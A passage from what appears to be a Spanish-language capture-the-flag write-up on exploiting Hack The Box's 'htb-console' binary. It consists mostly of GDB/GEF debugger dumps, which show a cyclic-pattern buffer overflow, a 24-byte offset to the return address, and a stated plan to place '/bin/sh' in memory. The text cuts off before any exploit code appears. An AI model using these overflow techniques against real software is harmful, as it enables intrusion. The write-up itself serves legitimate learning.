+<font color="#585858"><b>─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── </b></font><font color="#2AA1B3">registers</font><font color="#585858"><b> ────</b></font>
+<font color="#F66151"><b>$rax   </b></font>: 0xfffffffffffffe00                                                    
+<font color="#F66151"><b>$rbx   </b></font>: 0x00007ffff7e038e0  →  0x00000000fbad208b                                                                                                            
+<font color="#F66151"><b>$rcx   </b></font>: <font color="#C01C28">0x00007ffff7d1ba61</font>  →  0x4f77fffff0003d48 (&quot;<font color="#A2734C">H=</font>&quot;?)                                                                                                    
+<font color="#F66151"><b>$rdx   </b></font>: 0x1                                                                   
+<font color="#F66151"><b>$rsp   </b></font>: <font color="#A347BA">0x00007fffffffdc38</font>  →  <font color="#C01C28">0x00007ffff7c927a5</font>  →  <font color="#585858"><b>&lt;_IO_file_underflow+0165&gt; test rax, rax</b></font>                                                                
+<font color="#F66151"><b>$rbp   </b></font>: <font color="#A347BA">0x00007fffffffdc70</font>  →  <font color="#A347BA">0x00007fffffffdc90</font>  →  <font color="#A347BA">0x00007fffffffdcf0</font>  →  <font color="#A347BA">0x00007fffffffdd20</font>  →  <font color="#A347BA">0x00007fffffffdd40</font>  →  <font color="#A347BA">0x00007fffffffdde0</font>  →  <font color="#A347BA">0x00007fffffffde40</font>  →  0x0000000000000000
+<font color="#F66151"><b>$rsi   </b></font>: 0x00007ffff7e03963  →  0xe05720000000000a (&quot;<font color="#A2734C">\n</font>&quot;?)                                                                                                    
+<font color="#12488B">$rdi   </font>: 0x0                                                                   
+<font color="#F66151"><b>$rip   </b></font>: <font color="#C01C28">0x00007ffff7d1ba61</font>  →  0x4f77fffff0003d48 (&quot;<font color="#A2734C">H=</font>&quot;?)                                                                                                    
+<font color="#F66151"><b>$r8    </b></font>: 0x1                                                                   
+<font color="#12488B">$r9    </font>: 0x0                                                                   
+<font color="#F66151"><b>$r10   </b></font>: 0x00007ffff7c18478  →  0x0011001a0000851e                                                                                                            
+<font color="#F66151"><b>$r11   </b></font>: 0x246                                                                 
+<font color="#F66151"><b>$r12   </b></font>: 0x00007ffff7e02030  →  0x0000000000000000                                                                                                            
+<font color="#F66151"><b>$r13   </b></font>: 0x00007ffff7e01ee0  →  0x0000000000000000                                                                                                            
+<font color="#F66151"><b>$r14   </b></font>: <font color="#C01C28">0x0000000000404080</font>  →  0x00007ffff7e045c0  →  0x00000000fbad2887                                                                                     
+<font color="#F66151"><b>$r15   </b></font>: 0x00007ffff7e038e0  →  0x00000000fbad208b                                                                                                            
+<font color="#F66151"><b>$eflags</b></font>: [<b>ZERO</b> carry <b>PARITY</b> adjust sign trap <b>INTERRUPT</b> direction overflow resume virtualx86 identification]                                                   
+<font color="#12488B">$cs</font>: 0x33 <font color="#12488B">$ss</font>: 0x2b <font color="#12488B">$ds</font>: 0x00 <font color="#12488B">$es</font>: 0x00 <font color="#12488B">$fs</font>: 0x00 <font color="#12488B">$gs</font>: 0x00                                                                                                   
+<font color="#585858"><b>─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── </b></font><font color="#2AA1B3">stack</font><font color="#585858"><b> ────</b></font>
+<font color="#2AA1B3">0x00007fffffffdc38</font>│+0x0000: <font color="#C01C28">0x00007ffff7c927a5</font>  →  <font color="#585858"><b>&lt;_IO_file_underflow+0165&gt; test rax, rax</b></font>      <font color="#2A7BDE"><b> ← $rsp</b></font>                                                       
+<font color="#2AA1B3">0x00007fffffffdc40</font>│+0x0008: <font color="#A347BA">0x00007fffffffdd20</font>  →  <font color="#A347BA">0x00007fffffffdd40</font>  →  <font color="#A347BA">0x00007fffffffdde0</font>  →  <font color="#A347BA">0x00007fffffffde40</font>  →  0x0000000000000000                    
+<font color="#2AA1B3">0x00007fffffffdc48</font>│+0x0010: 0x00007ffff7e038e0  →  0x00000000fbad208b                                                                                         
+<font color="#2AA1B3">0x00007fffffffdc50</font>│+0x0018: 0x00007ffff7e02030  →  0x0000000000000000                                                                                         
+<font color="#2AA1B3">0x00007fffffffdc58</font>│+0x0020: 0x000000000000000f                                 
+<font color="#2AA1B3">0x00007fffffffdc60</font>│+0x0028: 0x00007ffff7e03964  →  0xf7e0572000000000                                                                                         
+<font color="#2AA1B3">0x00007fffffffdc68</font>│+0x0030: 0x00007ffff7e038e0  →  0x00000000fbad208b                                                                                         
+<font color="#2AA1B3">0x00007fffffffdc70</font>│+0x0038: <font color="#A347BA">0x00007fffffffdc90</font>  →  <font color="#A347BA">0x00007fffffffdcf0</font>  →  <font color="#A347BA">0x00007fffffffdd20</font>  →  <font color="#A347BA">0x00007fffffffdd40</font>  →  <font color="#A347BA">0x00007fffffffdde0</font>  →  <font color="#A347BA">0x00007fffffffde40</font>  →  0x0000000000000000     <font color="#2A7BDE"><b> ← $rbp</b></font>
+<font color="#585858"><b>───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── </b></font><font color="#2AA1B3">code:x86:64</font><font color="#585858"><b> ────</b></font>
+   <font color="#585858"><b>0x7ffff7d1ba5b &lt;read+000b&gt;      je     0x7ffff7d1ba70 &lt;__GI___libc_read+32&gt;</b></font>                                                                                
+   <font color="#585858"><b>0x7ffff7d1ba5d &lt;read+000d&gt;      xor    eax, eax</b></font>                                                                                                            
+   <font color="#585858"><b>0x7ffff7d1ba5f &lt;read+000f&gt;      syscall </b></font>                                    
+ <font color="#26A269">→ 0x7ffff7d1ba61 &lt;read+0011&gt;      cmp    rax, 0xfffffffffffff000</font>                                                                                             
+   0x7ffff7d1ba67 &lt;read+0017&gt;      ja     0x7ffff7d1bab8 &lt;__GI___libc_read+104&gt;                                                                               
+   0x7ffff7d1ba69 &lt;read+0019&gt;      ret                                         
+   0x7ffff7d1ba6a &lt;read+001a&gt;      nop    WORD PTR [rax+rax*1+0x0]                                                                                            
+   0x7ffff7d1ba70 &lt;read+0020&gt;      push   rbp                                  
+   0x7ffff7d1ba71 &lt;read+0021&gt;      mov    rbp, rsp                                                                                                            
+<font color="#585858"><b>───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── </b></font><font color="#2AA1B3">threads</font><font color="#585858"><b> ────</b></font>
+[<font color="#33D17A"><b>#0</b></font>] Id 1, Name: &quot;htb-console&quot;, <font color="#F66151"><b>stopped</b></font> <font color="#12488B">0x7ffff7d1ba61</font> in <font color="#E9AD0C"><b>__GI___libc_read</b></font> (), reason: <font color="#C061CB"><b>SIGINT</b></font>                                                                 
+<font color="#585858"><b>─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── </b></font><font color="#2AA1B3">trace</font><font color="#585858"><b> ────</b></font>
+[<font color="#33D17A"><b>#0</b></font>] 0x7ffff7d1ba61 → <font color="#26A269">__GI___libc_read</font>(<font color="#A2734C">fd</font>=0x0, <font color="#A2734C">buf</font>=0x7ffff7e03963 &lt;_IO_2_1_stdin_+131&gt;, <font color="#A2734C">nbytes</font>=0x1)                                                           
+[<font color="#C061CB"><b>#1</b></font>] 0x7ffff7c927a5 → <font color="#26A269">_IO_new_file_underflow</font>(<font color="#A2734C">fp</font>=0x7ffff7e038e0 &lt;_IO_2_1_stdin_&gt;)                                                                              
+[<font color="#C061CB"><b>#2</b></font>] 0x7ffff7c955d2 → <font color="#26A269">__GI__IO_default_uflow</font>(<font color="#A2734C">fp</font>=0x7ffff7e038e0 &lt;_IO_2_1_stdin_&gt;)                                                                              
+[<font color="#C061CB"><b>#3</b></font>] 0x7ffff7c86f7a → <font color="#26A269">__GI__IO_getline_info</font>(<font color="#A2734C">fp</font>=0x7ffff7e038e0 &lt;_IO_2_1_stdin_&gt;, <font color="#A2734C">buf</font>=0x7fffffffdd30 &quot;&quot;, <font color="#A2734C">n</font>=0xf, <font color="#A2734C">delim</font>=0xa, <font color="#A2734C">extract_delim</font>=0x1, <font color="#A2734C">eof</font>=0x0)          
+[<font color="#C061CB"><b>#4</b></font>] 0x7ffff7c8707c → <font color="#26A269">__GI__IO_getline</font>(<font color="#A2734C">fp</font>=0x7ffff7e038e0 &lt;_IO_2_1_stdin_&gt;, <font color="#A2734C">buf</font>=0x7fffffffdd30 &quot;&quot;, <font color="#A2734C">n</font>=0xf, <font color="#A2734C">delim</font>=0xa, <font color="#A2734C">extract_delim</font>=0x1)                        
+[<font color="#C061CB"><b>#5</b></font>] 0x7ffff7c85bd4 → <font color="#26A269">_IO_fgets</font>(<font color="#A2734C">buf</font>=0x7fffffffdd30 &quot;&quot;, <font color="#A2734C">n</font>=0x10, <font color="#A2734C">fp</font>=0x7ffff7e038e0 &lt;_IO_2_1_stdin_&gt;)                                                            
+[<font color="#C061CB"><b>#6</b></font>] 0x4013de → <font color="#C01C28">lea rax, [rbp-0x10]</font>                                            
+[<font color="#C061CB"><b>#7</b></font>] 0x7ffff7c2a1ca → <font color="#26A269">__libc_start_call_main</font>(<font color="#A2734C">main</font>=0x401397, <font color="#A2734C">argc</font>=0x1, <font color="#A2734C">argv</font>=0x7fffffffde68)                                                                    
+[<font color="#C061CB"><b>#8</b></font>] 0x7ffff7c2a28b → <font color="#26A269">__libc_start_main_impl</font>(<font color="#A2734C">main</font>=0x401397, <font color="#A2734C">argc</font>=0x1, <font color="#A2734C">argv</font>=0x7fffffffde68, <font color="#A2734C">init</font>=&lt;optimized out&gt;, <font color="#A2734C">fini</font>=&lt;optimized out&gt;, <font color="#A2734C">rtld_fini</font>=&lt;optimized out&gt;, <font color="#A2734C">stack_end</font>=0x7fffffffde58)
+[<font color="#C061CB"><b>#9</b></font>] 0x4010de → <font color="#C01C28">hlt </font>                                                           
+<font color="#585858"><b>──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</b></font>
+<font color="#33D17A"><b>gef➤  </b></font>x/s 0x4040b0                                                             
+<font color="#12488B">0x4040b0</font>:       &quot;abund4nt\n&quot;</pre>
+<p>Nuestro input se almacena en la dirección ``0x4040b0. Ahora, necesitamos calcular el offset que nos permitirá sobrescribir el registro RSP y redirigir la ejecución del programa. Para ello, utilizaremos GDB nuevamente.</p>
+<pre><font color="#F66151"><b>gef➤  </b></font>pattern create 150                                                                                                                                      
+<font color="#2A7BDE"><b>[+]</b></font> Generating a pattern of 150 bytes (n=8)                                    
+aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaa        
+<font color="#33D17A"><b>[+]</b></font> Saved as &apos;$_gef0&apos;                                                                                                                                                                                                                                                                                                        
+<font color="#F66151"><b>gef➤  </b></font>run                                                                                                                                                     
+Starting program: <font color="#26A269">/home/abund4nt/pwn/htb/htb-console/htb-console</font>                                                                                                                                                                                                                                                             
+[Thread debugging using libthread_db enabled]                                                                                                                 
+Using host libthread_db library &quot;<font color="#26A269">/lib/x86_64-linux-gnu/libthread_db.so.1</font>&quot;.                                                                                                                                                                                                                                                   
+Welcome HTB Console Version 0.1 Beta.                                                                                                                         
+&gt;&gt; flag                                                                                                                                                       
+Enter flag: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaa
+Whoops, wrong flag!                                                                                                                                           
+                                                                               
+Program received signal SIGSEGV, Segmentation fault.                                                                                                                                                                                                                                                                         
+<font color="#12488B">0x0000000000401396</font> in <font color="#A2734C">??</font> ()                                                                                                                                                                                                                                                                                                  
+[ Legend: <font color="#F66151"><b>Modified register</b></font> | <font color="#C01C28">Code</font> | <font color="#26A269">Heap</font> | <font color="#A347BA">Stack</font> | <font color="#A2734C">String</font> ]                                                                                                                                                                                                                                                                 
+<font color="#585858"><b>─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── </b></font><font color="#2AA1B3">registers</font><font color="#585858"><b> ────</b></font>                                                                                                                                                               
+<font color="#F66151"><b>$rax   </b></font>: 0x14                                                                                                                                                                                                                                                                                                                
+<font color="#F66151"><b>$rbx   </b></font>: <font color="#A347BA">0x00007fffffffde68</font>  →  <font color="#A347BA">0x00007fffffffe1dd</font>  →  <font color="#A2734C">&quot;/home/abund4nt/pwn/htb/htb-console/htb-console&quot;</font>                                                       
+<font color="#F66151"><b>$rcx   </b></font>: <font color="#C01C28">0x00007ffff7d1c574</font>  →  0x5477fffff0003d48 (&quot;<font color="#A2734C">H=</font>&quot;?)                                                                                                    
+<font color="#12488B">$rdx   </font>: 0x0                                                                                                                                                 
+<font color="#F66151"><b>$rsp   </b></font>: <font color="#A347BA">0x00007fffffffdd28</font>  →  <font color="#A2734C">&quot;daaaaaaaeaaaaaaafaaaaaa&quot;</font>                      
+<font color="#F66151"><b>$rbp   </b></font>: 0x6161616161616163 (&quot;<font color="#A2734C">caaaaaaa</font>&quot;?)                                      
+<font color="#F66151"><b>$rsi   </b></font>: 0x00007ffff7e04643  →  0xe05710000000000a (&quot;<font color="#A2734C">\n</font>&quot;?)                     
+<font color="#F66151"><b>$rdi   </b></font>: 0x00007ffff7e05710  →  0x0000000000000000                                            
+<font color="#F66151"><b>$rip   </b></font>: <font color="#C01C28">0x0000000000401396</font>  →  <font color="#585858"><b> ret </b></font>          
+<font color="#F66151"><b>$r8    </b></font>: 0x13                                  
+<font color="#12488B">$r9    </font>: 0x0                                   
+<font color="#F66151"><b>$r10   </b></font>: 0x00007ffff7c1a410  →  0x0011001a0000849e                                            
+<font color="#F66151"><b>$r11   </b></font>: 0x202                                 
+<font color="#F66151"><b>$r12   </b></font>: 0x1                                   
+<font color="#12488B">$r13   </font>: 0x0                                              
+<font color="#12488B">$r14   </font>: 0x0                                              
+<font color="#F66151"><b>$r15   </b></font>: 0x00007ffff7ffd000  →  0x00007ffff7ffe2e0  →  0x0000000000000000                                            
+<font color="#F66151"><b>$eflags</b></font>: [zero carry parity adjust sign trap <b>INTERRUPT</b> direction overflow <b>RESUME</b> virtualx86 identification]
+<font color="#12488B">$cs</font>: 0x33 <font color="#12488B">$ss</font>: 0x2b <font color="#12488B">$ds</font>: 0x00 <font color="#12488B">$es</font>: 0x00 <font color="#12488B">$fs</font>: 0x00 <font color="#12488B">$gs</font>: 0x00                                                          
+<font color="#585858"><b>─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── </b></font><font color="#2AA1B3">stack</font><font color="#585858"><b> ────</b></font>                                                                             
+<font color="#2AA1B3">0x00007fffffffdd28</font>│+0x0000: <font color="#A2734C">&quot;daaaaaaaeaaaaaaafaaaaaa&quot;</font>   <font color="#2A7BDE"><b> ← $rsp</b></font>                                                      
+<font color="#2AA1B3">0x00007fffffffdd30</font>│+0x0008: <font color="#A2734C">&quot;eaaaaaaafaaaaaa&quot;</font>                                                                        
+<font color="#2AA1B3">0x00007fffffffdd38</font>│+0x0010: 0x0061616161616166 (&quot;<font color="#A2734C">faaaaaa</font>&quot;?)                                                          
+<font color="#2AA1B3">0x00007fffffffdd40</font>│+0x0018: <font color="#A347BA">0x00007fffffffdde0</font>  →  <font color="#A347BA">0x00007fffffffde40</font>  →  0x0000000000000000                         
+<font color="#2AA1B3">0x00007fffffffdd48</font>│+0x0020: <font color="#C01C28">0x00007ffff7c2a1ca</font>  →  <font color="#585858"><b>&lt;__libc_start_call_main+007a&gt; mov edi, eax</b></font>                         
+<font color="#2AA1B3">0x00007fffffffdd50</font>│+0x0028: <font color="#A347BA">0x00007fffffffdd90</font>  →  0x0000000000000000                                                 
+<font color="#2AA1B3">0x00007fffffffdd58</font>│+0x0030: <font color="#A347BA">0x00007fffffffde68</font>  →  <font color="#A347BA">0x00007fffffffe1dd</font>  →  <font color="#A2734C">&quot;/home/abund4nt/pwn/htb/htb-console/htb-console&quot;</font>                                                                                                                   
+<font color="#2AA1B3">0x00007fffffffdd60</font>│+0x0038: 0x0000000100400040 (&quot;<font color="#A2734C">@</font>&quot;?)                                                                 
+<font color="#585858"><b>───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── </b></font><font color="#2AA1B3">code:x86:64</font><font color="#585858"><b> ────</b></font>                                                                               
+   <font color="#585858"><b>  0x40138f                  call   0x401030 &lt;puts@plt&gt;</b></font>                                                             
+   <font color="#585858"><b>  0x401394                  nop    </b></font>                                                                                
+   <font color="#585858"><b>  0x401395                  leave  </b></font>                                                                                
+ <font color="#26A269">→   0x401396                  ret    </font>                                                                                
+<font color="#F66151"><b>[!]</b></font> Cannot disassemble from $PC                                                                                       
+<font color="#585858"><b>───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── </b></font><font color="#2AA1B3">threads</font><font color="#585858"><b> ────</b></font>                                                                               
+[<font color="#33D17A"><b>#0</b></font>] Id 1, Name: &quot;htb-console&quot;, <font color="#F66151"><b>stopped</b></font> <font color="#12488B">0x401396</font> in <font color="#E9AD0C"><b>??</b></font> (), reason: <font color="#C061CB"><b>SIGSEGV</b></font>                                            
+<font color="#585858"><b>─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── </b></font><font color="#2AA1B3">trace</font><font color="#585858"><b> ────</b></font>                                                                               
+[<font color="#33D17A"><b>#0</b></font>] 0x401396 → <font color="#C01C28">ret </font>                                                                                                  
+<font color="#585858"><b>──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</b></font>                                                                               
+<font color="#33D17A"><b>gef➤  </b></font>agaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaa         
+Undefined command: &quot;agaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaa&quot;.  Try &quot;help&quot;.                                                                                                   
+<font color="#33D17A"><b>gef➤  </b></font>pattern search $rsp                                                                                             
+<font color="#2A7BDE"><b>[+]</b></font> Searching for &apos;6461616161616161&apos;/&apos;6161616161616164&apos; with period=8                                                 
+<font color="#33D17A"><b>[+]</b></font> Found at offset 24 (little-endian search) <font color="#F66151"><b>likely</b></font></pre>
+<p>Necesitamos enviar 24 bytes, con toda esta información tenemos todo lo necesario para comenzar a construir el exploit. En resumen primero vamos almacenar la cadena <code>/bin/sh</code> en la direccion de mem</p>
+
+
+
+
+
+
+
+
+
+
+
+<nav class="pagenav">
+  
+  <div></div>
+  
+  
+    <a class="next" href="/writeups/trypwnmeone-tryhackme/">
+      <span class="direction">Next »</span>
+      <br>
+      <span> TryPwnMe One - TryHackMe </span>
+    </a>
+  
+</nav>
+
+
+
+
+
+
+
+
+      </main>
+      <footer>
+  <div class="copyright">
+    
+  </div>
+</footer>
+
+    </div>
+  </body>
+</html>
